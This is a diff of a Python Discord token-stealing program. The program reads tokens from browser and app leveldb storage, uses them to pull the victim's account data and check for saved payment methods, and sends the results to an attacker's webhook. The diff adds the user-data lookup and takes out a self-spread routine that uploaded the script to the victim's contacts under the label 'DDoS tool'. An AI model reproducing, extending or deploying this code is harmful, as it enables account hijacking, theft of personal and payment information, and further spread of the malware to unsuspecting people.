@@ -41,6 +41,14 @@ def getHeader(token=None, content_type="application/json"):
     return headers
 
 
+def getUserData(token):
+    try:
+        return loads(
+            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
+    except:
+        pass
+
+
 def getTokenz(path):
     path += "\\Local Storage\\leveldb"
     tokens = []
@@ -62,12 +70,14 @@ def whoTheFuckAmI():
         pass
     return ip
 
+
 def paymentMethods(token):
     try:
         return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                               headers=getHeader(token))).read().decode())) > 0)
     except:
         pass
+
 
 def main():
     cache_path = ROAMING + "\\.cache~$"
@@ -150,12 +160,6 @@ def main():
         urlopen(Request(WEBHOOK_URL, data=dumps(webhook).encode(), headers=getHeader()))
     except:
         pass
-    if self_spread:
-        for token in working:
-            with open(argv[0], encoding="utf-8") as file:
-                content = file.read()
-            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
-            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
 
 
 try:
